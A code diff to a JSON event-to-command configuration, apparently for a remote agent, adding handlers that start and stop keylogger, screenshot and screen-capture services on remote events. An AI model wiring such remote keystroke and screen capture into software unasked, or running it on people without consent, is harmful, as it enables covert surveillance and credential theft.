@@ -11,6 +11,36 @@
             "command": "service live_overview stop"
         },
         {
+            "event": "agent/*",
+            "data": "startKeylogger",
+            "command": "service keylogger start"
+        },
+        {
+            "event": "agent/*",
+            "data": "stopKeylogger",
+            "command": "service keylogger stop"
+        },
+        {
+            "event": "agent/*",
+            "data": "startScreenshot",
+            "command": "service screenshot start"
+        },
+        {
+            "event": "agent/*",
+            "data": "stopScreenshot",
+            "command": "service screenshot stop"
+        },
+        {
+            "event": "agent/*",
+            "data": "startScreenCapture",
+            "command": "service screen_capture start"
+        },
+        {
+            "event": "agent/*",
+            "data": "stopScreenCapture",
+            "command": "service screen_capture stop"
+        },
+        {
             "event": "meta",
             "data": "*",
             "command": "echo \"Meta event raised with data ${ENV_data}\""
